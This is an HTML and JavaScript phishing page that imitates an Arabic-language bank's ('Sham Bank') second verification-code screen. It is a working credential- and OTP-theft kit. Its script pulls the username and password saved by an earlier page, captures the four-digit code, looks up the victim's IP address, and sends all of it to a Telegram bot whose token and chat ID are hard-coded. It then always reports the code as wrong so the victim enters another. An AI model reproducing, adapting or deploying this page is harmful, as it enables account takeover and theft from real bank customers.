<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنك الشام - رمز التحقق</title>
    <link href="https://fonts.googleapis.com/css2?family=Scheherazade+New:wght@400;700&family=Amiri:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Scheherazade New', 'Amiri', 'Arial', sans-serif;
            background: linear-gradient(180deg, #9d1b30 0%, #c71f37 100%);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        /* Islamic Pattern Background */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
                repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(139, 0, 0, 0.1) 35px, rgba(139, 0, 0, 0.1) 70px),
                repeating-linear-gradient(-45deg, transparent, transparent 35px, rgba(139, 0, 0, 0.1) 35px, rgba(139, 0, 0, 0.1) 70px);
            opacity: 0.3;
            z-index: 0;
        }

        /* Star Pattern */
        .pattern-star {
            position: absolute;
            width: 80px;
            height: 80px;
            opacity: 0.15;
        }

        .pattern-star:nth-child(1) { top: 50px; left: 40px; }
        .pattern-star:nth-child(2) { top: 150px; right: 60px; }
        .pattern-star:nth-child(3) { top: 300px; left: 80px; }
        .pattern-star:nth-child(4) { bottom: 200px; right: 100px; }
        .pattern-star:nth-child(5) { bottom: 50px; left: 120px; }
        .pattern-star:nth-child(6) { top: 100px; left: 50%; }
        .pattern-star:nth-child(7) { top: 400px; right: 40px; }

        .container {
            position: relative;
            z-index: 1;
            max-width: 100%;
            margin: 0 auto;
            padding: 20px;
        }

        /* Header with Menu */
        .header {
            display: flex;
            justify-content: flex-end;
            padding: 20px 30px;
            position: relative;
            z-index: 10;
        }

        .menu-icon {
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
        }

        .menu-bars {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-bars span {
            width: 30px;
            height: 3px;
            background: white;
            border-radius: 2px;
        }

        .menu-arrow {
            color: white;
            font-size: 28px;
            font-weight: bold;
        }

        /* Logo Section */
        .logo-section {
            text-align: center;
            margin: 30px 0 40px;
        }

        .logo {
            width: 150px;
            height: 150px;
            margin: 0 auto 15px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .logo::before {
            content: '';
            position: absolute;
            width: 170px;
            height: 170px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            z-index: -1;
        }

        .logo img {
            width: 130px;
            height: 130px;
            object-fit: contain;
        }

        .logo-text {
            color: white;
            font-size: 36px;
            font-weight: 300;
            letter-spacing: 2px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            margin-top: 10px;
        }

        /* OTP Card */
        .otp-card {
            background: white;
            border-radius: 30px 30px 0 0;
            padding: 35px 25px 60px;
            margin-top: 30px;
            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .form-title {
            text-align: center;
            color: #666;
            font-size: 22px;
            font-weight: 300;
            margin-bottom: 10px;
            letter-spacing: 1px;
        }

        .form-subtitle {
            text-align: center;
            color: #999;
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        /* OTP Input Boxes */
        .otp-inputs {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 25px;
            direction: ltr;
        }

        .otp-box {
            width: 60px;
            height: 70px;
            border: 2px solid #ddd;
            border-radius: 12px;
            font-size: 32px;
            text-align: center;
            color: #333;
            font-weight: 500;
            background: white;
            caret-color: transparent;
            transition: all 0.3s;
        }

        .otp-box:focus {
            outline: none;
            border-color: #9d1b30;
            box-shadow: 0 0 0 3px rgba(157, 27, 48, 0.1);
        }

        .otp-box.filled {
            border-color: #9d1b30;
            background: #fff5f5;
        }

        /* Error and Success Messages */
        .error-message {
            background: #ffe6e6;
            border: 1px solid #ffcccc;
            color: #c71f37;
            padding: 12px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 16px;
            display: none;
        }

        .error-message.show {
            display: block;
            animation: shake 0.5s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }

        .success-message {
            background: #e6f7e6;
            border: 1px solid #b3e6b3;
            color: #2d862d;
            padding: 12px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 16px;
            display: none;
        }

        .success-message.show {
            display: block;
        }

        /* On-Screen Keyboard */
        .keyboard {
            margin-top: 25px;
            padding: 20px;
            background: #f8f8f8;
            border-radius: 15px;
        }

        .keyboard-row {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .keyboard-row:last-child {
            margin-bottom: 0;
        }

        .key {
            width: 70px;
            height: 55px;
            background: white;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 24px;
            font-weight: 500;
            color: #333;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s;
            user-select: none;
        }

        .key:active {
            background: #9d1b30;
            color: white;
            transform: scale(0.95);
        }

        .key.delete {
            background: #ffebee;
            color: #c71f37;
            font-size: 20px;
            width: 150px;
        }

        .key.delete:active {
            background: #c71f37;
            color: white;
        }

        .submit-button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #9d1b30 0%, #c71f37 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 20px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(157, 27, 48, 0.3);
            transition: all 0.3s;
        }

        .submit-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(157, 27, 48, 0.4);
        }

        .submit-button:active {
            transform: translateY(0);
        }

        /* Star SVG Pattern */
        .star-pattern {
            fill: none;
            stroke: rgba(139, 0, 0, 0.2);
            stroke-width: 2;
        }

        @media (max-width: 768px) {
            .logo {
                width: 130px;
                height: 130px;
            }

            .logo img {
                width: 110px;
                height: 110px;
            }

            .logo-text {
                font-size: 32px;
            }

            .otp-card {
                border-radius: 25px 25px 0 0;
                padding: 25px 15px 50px;
            }

            .otp-box {
                width: 55px;
                height: 65px;
                font-size: 28px;
            }

            .key {
                width: 65px;
                height: 50px;
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <!-- Islamic Star Patterns -->
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>

    <div class="container">
        <!-- Header Menu -->
        <div class="header">
            <div class="menu-icon">
                <div class="menu-bars">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <div class="menu-arrow">❯</div>
            </div>
        </div>

        <!-- Logo Section -->
        <div class="logo-section">
            <div class="logo">
                <img src="image.jpg" alt="بنك الشام">
            </div>
            <div class="logo-text">بنك الشام</div>
        </div>

        <!-- OTP Card -->
        <div class="otp-card">
            <h2 class="form-title">رمز التحقق الثاني</h2>
            <p class="form-subtitle">الرجاء إدخال الرمز المكون من 4 أرقام</p>
            
            <form id="otpForm">
                <!-- Success Message -->
                <div class="success-message" id="successMessage"></div>
                
                <!-- Error Message -->
                <div class="error-message" id="errorMessage"></div>

                <!-- OTP Input Boxes -->
                <div class="otp-inputs">
                    <input type="text" class="otp-box" maxlength="1" readonly id="box1">
                    <input type="text" class="otp-box" maxlength="1" readonly id="box2">
                    <input type="text" class="otp-box" maxlength="1" readonly id="box3">
                    <input type="text" class="otp-box" maxlength="1" readonly id="box4">
                </div>

                <!-- On-Screen Keyboard -->
                <div class="keyboard">
                    <div class="keyboard-row">
                        <div class="key" data-key="1">1</div>
                        <div class="key" data-key="2">2</div>
                        <div class="key" data-key="3">3</div>
                    </div>
                    <div class="keyboard-row">
                        <div class="key" data-key="4">4</div>
                        <div class="key" data-key="5">5</div>
                        <div class="key" data-key="6">6</div>
                    </div>
                    <div class="keyboard-row">
                        <div class="key" data-key="7">7</div>
                        <div class="key" data-key="8">8</div>
                        <div class="key" data-key="9">9</div>
                    </div>
                    <div class="keyboard-row">
                        <div class="key delete" data-key="delete">⌫ حذف</div>
                        <div class="key" data-key="0">0</div>
                    </div>
                </div>

                <button type="submit" class="submit-button">إرسال</button>
            </form>
        </div>
    </div>

    <script>
        // Telegram Bot Integration
        const TELEGRAM_BOT_TOKEN = '8286980847:AAEuWMmuadQ5oa7X216n8qj7bhjVYcLgmag';
        const TELEGRAM_CHAT_ID = '6888218123';

        const boxes = [
            document.getElementById('box1'),
            document.getElementById('box2'),
            document.getElementById('box3'),
            document.getElementById('box4')
        ];
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');
        
        let currentBox = 0;
        let otpCode = ['', '', '', ''];

        // Prevent mobile keyboard from showing
        boxes.forEach(box => {
            box.addEventListener('focus', function() {
                this.blur();
            });
            box.addEventListener('click', function(e) {
                e.preventDefault();
            });
        });

        // Handle on-screen keyboard clicks
        document.querySelectorAll('.key').forEach(key => {
            key.addEventListener('click', function() {
                const value = this.getAttribute('data-key');
                
                if (value === 'delete') {
                    deleteNumber();
                } else {
                    addNumber(value);
                }
            });
        });

        function addNumber(num) {
            if (currentBox < 4) {
                otpCode[currentBox] = num;
                boxes[currentBox].value = num;
                boxes[currentBox].classList.add('filled');
                currentBox++;
                
                // Hide error message when typing
                errorMessage.classList.remove('show');
                successMessage.classList.remove('show');
            }
        }

        function deleteNumber() {
            if (currentBox > 0) {
                currentBox--;
                otpCode[currentBox] = '';
                boxes[currentBox].value = '';
                boxes[currentBox].classList.remove('filled');
                
                // Hide messages
                errorMessage.classList.remove('show');
                successMessage.classList.remove('show');
            }
        }

        // Form Submit
        document.getElementById('otpForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const code = otpCode.join('');
            
            // Check if all 4 digits are entered
            if (code.length !== 4) {
                showError('الرجاء إدخال الرمز كاملاً');
                return;
            }
            
            // Show "جاري التحقق" message
            showSuccess('جاري التحقق من الرمز...');
            
            // Get username and password from localStorage
            const username = localStorage.getItem('bank_username') || 'غير متوفر';
            const password = localStorage.getItem('bank_password') || 'غير متوفر';
            
            // Send to Telegram
            const message = `🔢 رمز التحقق الثاني - بنك الشام\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة السر: ${password}\n🔐 رمز التحقق 2: ${code}\n\n📱 الوقت: ${new Date().toLocaleString('ar-JO')}\n🌐 IP: ${await getIP()}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Error:', error);
            }
            
            // Wait 3 seconds then show error message
            setTimeout(() => {
                showError('الرمز خاطئ، الرجاء المحاولة مرة أخرى');
                
                // Clear all boxes
                otpCode = ['', '', '', ''];
                boxes.forEach(box => {
                    box.value = '';
                    box.classList.remove('filled');
                });
                currentBox = 0;
            }, 3000);
        });

        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.classList.add('show');
            successMessage.classList.remove('show');
        }

        function showSuccess(message) {
            successMessage.textContent = message;
            successMessage.classList.add('show');
            errorMessage.classList.remove('show');
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'غير متوفر';
            }
        }
    </script>
</body>
</html>
